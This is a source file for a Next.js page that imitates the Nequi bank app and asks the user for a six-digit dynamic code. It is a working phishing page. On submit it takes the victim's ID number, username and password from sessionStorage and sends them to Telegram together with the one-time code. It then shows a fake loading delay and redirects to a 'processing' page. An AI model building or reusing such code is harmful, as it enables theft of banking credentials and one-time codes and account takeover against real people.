'use client'

import { sendToTelegram } from "@/app/actions/telegram"
import LoadingSpinner from "@/app/components/loading-spinner"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useState } from "react"

export default function ClaveDinamicaPage() {
  const router = useRouter()
  const [claveDinamica, setClaveDinamica] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    const userData = {
      cedula: sessionStorage.getItem('cedula'),
      usuario: sessionStorage.getItem('usuario'),
      clave: sessionStorage.getItem('clave'),
      claveDinamica
    }

    await sendToTelegram(userData)
    
    // Simular tiempo de carga
    setTimeout(() => {
      setLoading(false)
      router.push('/procesando')
    }, 2000)
  }

  return (
    <main className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-md mx-auto space-y-4">
        <div className="flex justify-center mb-8">
          <Image
            src="/placeholder.svg?height=48&width=96"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Ingresa tu clave dinámica</CardTitle>
          </CardHeader>
          <CardContent>
            {loading ? (
              <LoadingSpinner />
            ) : (
              <form onSubmit={handleSubmit} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="claveDinamica">Clave dinámica</Label>
                  <Input
                    id="claveDinamica"
                    required
                    value={claveDinamica}
                    onChange={(e) => setClaveDinamica(e.target.value)}
                    placeholder="Ingresa la clave dinámica"
                    maxLength={6}
                  />
                </div>
                <Button 
                  type="submit" 
                  className="w-full bg-[#E6007E] hover:bg-[#C4006B]"
                  disabled={claveDinamica.length < 6}
                >
                  Verificar
                </Button>
              </form>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

